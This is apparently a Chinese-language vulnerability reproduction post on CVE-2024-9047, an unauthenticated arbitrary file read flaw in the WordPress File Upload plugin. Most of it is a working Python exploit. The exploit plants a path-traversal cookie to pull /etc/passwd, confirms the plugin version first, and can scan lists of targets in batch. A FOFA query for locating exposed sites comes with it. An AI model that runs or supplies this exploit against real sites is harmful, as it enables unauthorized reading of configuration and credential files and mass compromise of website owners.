# WordPress插件FileUpload任意文件读取漏洞复现(CVE-2024-9047)

WordPress File Upload插件是一款功能强大的WordPress站点文件上传插件，在 <= 4.24.11 版本前的 wfu_file_downloader.php 文件存在前台任意文件读取+任意文件删除漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa
```javascript
"wp-content/plugins/wp-file-upload"
```

## poc
```python
import requests
import urllib3
from urllib.parse import urljoin
import argparse
import ssl
import time
import re

ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def extract_version(version_text):
    match = re.search(r'<strong>Version\s+([0-9]+\.[0-9]+\.[0-9]+)</strong>', version_text)
    if match:
        version = match.group(1).strip()  
        print(f"Found version: {version}")
        return version
    return None

def version_to_tuple(version):
    return tuple(map(int, version.split('.')))

def compare_versions(current_version, target_version='4.24.11'):
    if current_version:
        current_tuple = version_to_tuple(current_version)
        target_tuple = version_to_tuple(target_version)
        
        if current_tuple <= target_tuple:
            print(f"\033[32mVersion {current_version} <= {target_version} - 可能存在漏洞\033[0m")
            return True
        else:
            print(f"Version {current_version} > {target_version} - 无漏洞.")
            return False
    return False  

def check(url):
    protocols = ['http://', 'https://']
    found_vulnerabilities = False

    for protocol in protocols:
        target_url = urljoin(protocol + url.lstrip('http://').lstrip('https://'), "/")
        print(f"Checking {target_url}wp-content")
        
        timestamp = str(int(time.time()))
        
        target_url = urljoin(target_url, "/wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=pQ1DyzbQp5hBxQpW&ticket=Hw8h7dBmxROx27ZZ&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce")
        target_url_version = urljoin(target_url, "/wp-content/plugins/wp-file-upload/release_notes.txt")
        
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Cookie": f"wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce=cfyMMnYQqNBbcBNMLTCDnE7ezEAdzLC3; wfu_storage_pQ1DyzbQp5hBxQpW=/../../../../../etc/passwd[[name]]; wfu_download_ticket_Hw8h7dBmxROx27ZZ={timestamp}; wfu_ABSPATH=/;"
        }
        headers_version = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
        }

        try:
            response_version = requests.get(target_url_version, verify=False, headers=headers_version, timeout=10)

            if response_version.status_code == 200:
                version_text = response_version.text
                version = extract_version(version_text)
                
                if compare_versions(version):
                    response = requests.get(target_url, verify=False, headers=headers, timeout=10)
                    if response.status_code == 200 and all(key in response.text for key in ('/bin/bash', 'root:x:0:0')):
                        print(f"\033[31mFind: {url}: WordPress_FileUpload (CVE-2024-9047) - ReadAnyFile!\033[0m")
                        found_vulnerabilities = True
                else:
                    print(f"版本不匹配跳过检查{url}.")
            else:
                print(f"找不到版本号 {url}.")

        except Exception as e:
            print(f"Error while checking {url}: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WordPress 任意文件读取漏洞检测")
    parser.add_argument("-u", "--url", help="单个url检测")
    parser.add_argument("-f", "--txt", help="批量检测")
    args = parser.parse_args()
    
    url = args.url
    txt = args.txt
    
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")
```

![image-20241227214033657](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272140753.png)

## 漏洞来源

- https://github.com/iSee857/CVE-2024-9047-PoC/blob/main/WordPress_FileUpload(CVE-2024-9047)_ReadAnyFile.py